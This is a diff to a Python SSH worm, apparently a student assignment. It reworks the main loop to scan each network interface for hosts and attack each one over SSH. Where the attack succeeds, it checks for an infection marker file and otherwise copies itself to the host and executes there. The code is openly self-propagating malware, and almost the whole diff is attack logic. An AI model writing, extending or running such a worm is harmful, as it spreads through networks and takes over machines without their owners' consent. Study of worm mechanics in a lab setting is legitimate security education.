@@ -1,9 +1,7 @@
-from unittest.mock import NonCallableMagicMock
 import paramiko
 import sys
 import socket
 import nmap
-import netinfo
 import netifaces as ni
 import os
 
@@ -189,72 +187,78 @@ if __name__ == "__main__":
 			markInfected()
 
 	# TODO: Get the IP of the current system
-			ip = getMyIP()
+	net = ni.interfaces()
+	net.remove("lo")
+	for n in net:
+		print( "Interface: ", n)
+		ip = getMyIP(n)
 
 
-	# Get the hosts on the same network
-	networkHosts = getHostsOnTheSameNetwork()
+		# Get the hosts on the same network
+		networkHosts = getHostsOnTheSameNetwork()
 
-	# TODO: Remove the IP of the current system
-	# from the list of discovered systems (we
-	# do not want to target ourselves!).
-if ip in networkHosts:
-	networkHosts.remove(ip)
+		# TODO: Remove the IP of the current system
+		# from the list of discovered systems (we
+		# do not want to target ourselves!).
 
-	print("Found hosts: ", networkHosts)
+		networkHosts.remove(ip)
+
+		print("Found hosts: ", networkHosts)
 
 
-	# Go through the network hosts
-	for host in networkHosts:
-		
-		# Try to attack this host
-		sshInfo =  attackSystem(host)
-		
-		print(sshInfo)
-		
-		
-		# Did the attack succeed?
-		if sshInfo:
+		# Go through the network hosts
+		for host in networkHosts:
 			
-			print("Trying to spread")
-			infected = None
-			try: 
-				sftp = sshInfo[0].open_sftp()
-				infected = sftp.file(INFECTED_MARKER_FILE, 'r')
-				sftp.close()
-			except IOError:
-				print("Get this system infected")
-				spreadAndExecute(sshInfo[0])
-				print("Spreading Complete")
-			if infected:
-					print(f"{host} is already infected")
-			sshInfo[0].close()
-			# TODO: Check if the system was	
-			# already infected. This can be
-			# done by checking whether the
-			# remote system contains /tmp/infected.txt
-			# file (which the worm will place there
-			# when it first infects the system)
-			# This can be done using code similar to
-			# the code below:
-			# try:
-			#	 remotepath = '/tmp/infected.txt'
-			#        localpath = '/home/cpsc/'
-			#	 # Copy the file from the specified
-			#	 # remote path to the specified
-			# 	 # local path. If the file does exist
-			#	 # at the remote path, then get()
-			# 	 # will throw IOError exception
-			# 	 # (that is, we know the system is
-			# 	 # not yet infected).
-			# 
-			#        sftp.get(filepath, localpath)
-			# except IOError:
-			#       print "This system should be infected"
-			#
-			#
-			# If the system was already infected proceed.
-			# Otherwise, infect the system and terminate.
-			# Infect that system
+			# Try to attack this host
+			sshInfo =  attackSystem(host)
 			
-			print("Spreading complete")	
+			print(sshInfo)
+			
+			
+			# Did the attack succeed?
+			if sshInfo:
+				
+				print("Trying to spread")
+				if not isInfectedSystem():
+					# If the system was already infected proceed.
+					# Otherwise, infect the system and terminate.
+					# Infect that system
+					try:
+						print("[ INFECTING . . . . ]")
+						spreadAndExecute( sshInfo[0])
+					except:
+						infecting_error = sys.exc_info()[0]
+						print(infecting_error)
+				else:
+					print("[ WORM ALREADY FOUND ]")
+				sshInfo[0].close()
+				# TODO: Check if the system was	
+				# already infected. This can be
+				# done by checking whether the
+				# remote system contains /tmp/infected.txt
+				# file (which the worm will place there
+				# when it first infects the system)
+				# This can be done using code similar to
+				# the code below:
+				# try:
+				#	 remotepath = '/tmp/infected.txt'
+				#        localpath = '/home/cpsc/'
+				#	 # Copy the file from the specified
+				#	 # remote path to the specified
+				# 	 # local path. If the file does exist
+				#	 # at the remote path, then get()
+				# 	 # will throw IOError exception
+				# 	 # (that is, we know the system is
+				# 	 # not yet infected).
+				# 
+				#        sftp.get(filepath, localpath)
+				# except IOError:
+				#       print "This system should be infected"
+				#
+				#
+				# If the system was already infected proceed.
+				# Otherwise, infect the system and terminate.
+				# Infect that system
+				
+				print("Spreading complete")	
+	exit()
